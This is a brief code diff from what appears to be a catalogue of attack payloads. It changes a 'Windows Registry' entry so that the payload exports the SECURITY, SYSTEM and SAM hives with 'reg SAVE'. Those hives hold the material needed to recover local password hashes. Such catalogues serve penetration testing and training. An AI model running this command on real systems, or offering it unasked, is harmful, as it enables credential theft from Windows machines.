@@ -165,8 +165,8 @@ Load({
 })
 
 Load({
-	title: "Export Windows Security Hive",
-	payload: "reg SAVE HKLM\\SECURITY security.hive",  
+	title: "Export Windows Security Hives",
+	payload: "reg SAVE HKLM\\SECURITY security.hive && reg SAVE HKLM\\SYSTEM system.hive && reg SAVE HKLM\\SAM sam.hive ",  
 	category: "Windows Registry"
 })
 
